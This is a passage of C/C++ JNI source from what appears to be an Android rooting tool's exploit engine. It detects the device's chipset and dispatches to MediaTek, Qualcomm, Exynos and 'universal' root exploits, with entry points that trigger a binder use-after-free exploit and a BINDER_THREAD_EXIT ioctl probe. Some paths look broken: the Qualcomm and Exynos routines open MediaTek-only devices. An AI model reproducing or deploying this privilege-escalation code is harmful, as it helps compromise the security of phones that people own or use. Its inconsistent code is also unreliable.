            while (fgets(line, sizeof(line), f)) {
                if (strstr(line, "Hardware")) {
                    char* p = strchr(line, ':');
                    if (p) {
                        p++;
                        while (*p == ' ') p++;
                        hardware = p;
                    }
                    break;
                }
            }
            fclose(f);
        }
    }

    if (hardware) {
        if (strstr(hardware, "mt") || strstr(hardware, "mediatek")) {
            LOGI("MediaTek detected");
            return do_mediatek_root();
        } else if (strstr(hardware, "qcom") || strstr(hardware, "qualcomm") || strstr(hardware, "snapdragon")) {
            LOGI("Qualcomm detected");
            return do_qualcomm_root();
        } else if (strstr(hardware, "exynos") || strstr(hardware, "samsung")) {
            LOGI("Exynos detected");
            return do_exynos_root();
        }
    }

    LOGI("Unknown SoC, trying universal exploits");
    return do_universal_root();
}

extern "C" {

JNIEXPORT jboolean JNICALL
Java_com_kostyfoss_kroshikroot_ExploitEngine_runMtkSuNative(JNIEnv* env, jclass clazz) {
    return (do_kroshik_root() == 0) ? JNI_TRUE : JNI_FALSE;
}

JNIEXPORT jboolean JNICALL
Java_com_kostyfoss_kroshikroot_ExploitEngine_runQualcommNative(JNIEnv* env, jclass clazz) {
    g_cmdq_fd = open("/dev/mtk_cmdq", O_RDWR);
    if (g_cmdq_fd < 0) {
        g_cmdq_fd = open("/dev/mtk_disp", O_RDWR);
    }
    if (g_cmdq_fd >= 0) {
        cmdq_alloc_dma(PAGE_SIZE);
    }
    int result = do_qualcomm_root();
    if (g_dma_va) munmap(g_dma_va, PAGE_SIZE);
    if (g_cmdq_fd >= 0) close(g_cmdq_fd);
    return (result == 0) ? JNI_TRUE : JNI_FALSE;
}

JNIEXPORT jboolean JNICALL
Java_com_kostyfoss_kroshikroot_ExploitEngine_runExynosNative(JNIEnv* env, jclass clazz) {
    g_cmdq_fd = open("/dev/mtk_cmdq", O_RDWR);
    if (g_cmdq_fd < 0) {
        g_cmdq_fd = open("/dev/mtk_disp", O_RDWR);
    }
    if (g_cmdq_fd >= 0) {
        cmdq_alloc_dma(PAGE_SIZE);
    }
    int result = do_exynos_root();
    if (g_dma_va) munmap(g_dma_va, PAGE_SIZE);
    if (g_cmdq_fd >= 0) close(g_cmdq_fd);
    return (result == 0) ? JNI_TRUE : JNI_FALSE;
}

JNIEXPORT jboolean JNICALL
Java_com_kostyfoss_kroshikroot_ExploitEngine_runMediatekNative(JNIEnv* env, jclass clazz) {
    return (do_mediatek_root() == 0) ? JNI_TRUE : JNI_FALSE;
}

JNIEXPORT jboolean JNICALL
Java_com_kostyfoss_kroshikroot_ExploitEngine_runUniversalNative(JNIEnv* env, jclass clazz) {
    return (do_universal_root() == 0) ? JNI_TRUE : JNI_FALSE;
}

JNIEXPORT jboolean JNICALL
Java_com_kostyfoss_kroshikroot_ExploitEngine_runBinderFullNative(JNIEnv* env, jclass clazz) {
    return (exploit_binder_uaf() == 0) ? JNI_TRUE : JNI_FALSE;
}

JNIEXPORT jboolean JNICALL
Java_com_kostyfoss_kroshikroot_ExploitEngine_runBinderNewNative(JNIEnv* env, jclass clazz) {
    int fd = open("/dev/binder", O_RDONLY);
    if (fd < 0) return JNI_FALSE;
    close(fd);
    return JNI_TRUE;
}

JNIEXPORT jboolean JNICALL
Java_com_kostyfoss_kroshikroot_ExploitEngine_runBinderOldNative(JNIEnv* env, jclass clazz) {
    int fd = open("/dev/binder", O_RDONLY);
    if (fd < 0) return JNI_FALSE;
    int err = ioctl(fd, BINDER_THREAD_EXIT, NULL);
    close(fd);
    return (err == 0) ? JNI_TRUE : JNI_FALSE;
}

}
